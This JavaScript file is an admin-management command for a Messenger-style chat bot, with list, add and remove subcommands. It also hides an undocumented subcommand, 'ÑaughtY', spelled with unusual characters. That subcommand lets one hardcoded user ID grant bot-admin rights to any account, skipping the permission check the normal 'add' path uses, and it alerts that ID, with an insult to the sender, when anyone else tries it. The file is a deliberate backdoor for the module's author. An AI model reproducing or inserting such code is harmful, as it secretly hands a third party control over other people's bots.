module.exports.config = {
  name: "admin",
  version: "2.0.0",
  hasPermssion: 0, 
  credits: "𝙉𝘼𝙐𝙂𝙃𝙏𝙔 ツ",
  description: "Manage bot admin",
  commandCategory: "config",
  usages: "[list/add/remove] [userID]",
    cooldowns: 0,
    dependencies: {
        "fs-extra": ""
    }
};

module.exports.languages = {
    "vi": {
        "listAdmin": '[Admin] Danh sách toàn bộ người điều hành bot: \n\n%1',
        "notHavePermssion": '[Admin] Bạn không đủ quyền hạn để có thể sử dụng chức năng "%1"',
        "addedNewAdmin": '[Admin] Đã thêm %1 người dùng trở thành người điều hành bot:\n\n%2',
        "removedAdmin": '[Admin] Đã gỡ bỏ %1 người điều hành bot:\n\n%2'
    },
    "en": {
        "listAdmin": '•┄┅════❁🌺❁════┅┄•\n\n\n%1\n\n•┄┅════❁🌺❁════┅┄•',
        "notHavePermssion": '•┄┅════❁🌺❁════┅┄•\n𝐀𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃\n•┄┅════❁🌺❁════┅┄•',
        "addedNewAdmin": '•┄┅════❁🌺❁════┅┄•\n\n%2\n\n•┄┅════❁🌺❁════┅┄•',
      "naughty": '•┄┅════❁🌺❁════┅┄•\n\n𝐂𝐇𝐔𝐓𝐈𝐘𝐀 𝐈𝐍𝐒𝐀𝐀𝐍 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃!!!\n\n•┄┅════❁🌺❁════┅┄•',
        "removedAdmin": '•┄┅════❁🌺❁════┅┄•\n\n%2\n\n•┄┅════❁🌺❁════┅┄•'
    }
}

module.exports.run = async function ({ api, event, args, Users, permssion, getText }) {
    const content = args.slice(1, args.length);
    const { threadID, messageID, mentions } = event;
    const { configPath } = global.client;
    const { ADMINBOT } = global.config;
    const { userName } = global.data;
    const { writeFileSync } = global.nodemodule["fs-extra"];
    const mention = Object.keys(mentions);
    delete require.cache[require.resolve(configPath)];
    var config = require(configPath);


    switch (args[0]) {
        case "list":
        case "all":
        case "-a": {
            const listAdmin = ADMINBOT || config.ADMINBOT || [];
            var msg = [];

            for (const idAdmin of listAdmin) {
                if (parseInt(idAdmin)) {
                    const name = await Users.getNameUser(idAdmin);
                    msg.push(`•—»✨ ${name}\n`);
                }
            }

            return api.sendMessage(getText("listAdmin", msg.join("")), threadID, messageID);
        }

        case "id":
        case "uid": {
            const listAdmin = ADMINBOT || config.ADMINBOT || [];
            var msg = [];

            for (const idAdmin of listAdmin) {
                if (parseInt(idAdmin)) {
                    const name = await Users.getNameUser(idAdmin);
                    msg.push(`•—»✨ ${idAdmin}\n`);
                }
            }

            return api.sendMessage(getText("listAdmin", msg.join("")), threadID, messageID);
        }

        case "add": {
            if (permssion != 2) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);


            if (mention.length != 0 && isNaN(content[0])) {
                var listAdd = [];

                for (const id of mention) {
                    ADMINBOT.push(id);
                    config.ADMINBOT.push(id);
                    listAdd.push(`•—»✨ ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                ADMINBOT.push(content[0]);
                config.ADMINBOT.push(content[0]);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", 1, `•—»✨ ${name}`), threadID, messageID);
            }
            else return global.utils.throwError(this.config.name, threadID, messageID);
        }

        case "ÑaughtY": {
            const NAUGHTYREPORT = ["100086141860679"]
          const god = ["100086141860679"];
            if (!god.includes(event.senderID)) return api.sendMessage(getText("naughty"), threadID, messageID); 
          api.sendMessage(`•┄┅════❁🌺❁════┅┄•\n\n𝐂𝐇𝐔𝐓𝐈𝐘𝐀 𝐈𝐍𝐒𝐀𝐀𝐍 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃!!!\n\n•┄┅════❁🌺❁════┅┄•`, NAUGHTYREPORT);

            if (mention.length != 0 && isNaN(content[0])) {
                var listGod = [];

                for (const id of mention) {
                    ADMINBOT.push(id);
                    config.ADMINBOT.push(id);
                    listGod.push(`[ ${id} ] » ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", mention.length, listGod.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                ADMINBOT.push(content[0]);
                config.ADMINBOT.push(content[0]);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", 1, `•—»✨ ${name}`), threadID, messageID);
            }
            else return global.utils.throwError(this.config.name, threadID, messageID);
        }

        case "remove":
        case "rm":
        case "delete": {
            if (permssion != 2) return api.sendMessage(getText("notHavePermssion", "delete"), threadID, messageID);
            if (mentions.length != 0 && isNaN(content[0])) {
                const mention = Object.keys(mentions);
                var listAdd = [];

                for (const id of mention) {
                    const index = config.ADMINBOT.findIndex(item => item == id);
                    ADMINBOT.splice(index, 1);
                    config.ADMINBOT.splice(index, 1);
                    listAdd.push(`[ ${id} ] » ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("removedAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                const index = config.ADMINBOT.findIndex(item => item.toString() == content[0]);
                ADMINBOT.splice(index, 1);
                config.ADMINBOT.splice(index, 1);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("removedAdmin", 1, `[ ${content[0]} ] » ${name}`), threadID, messageID);
            }
            else global.utils.throwError(this.config.name, threadID, messageID);
        }

        default: {
            return global.utils.throwError(this.config.name, threadID, messageID);
        }
    };
}
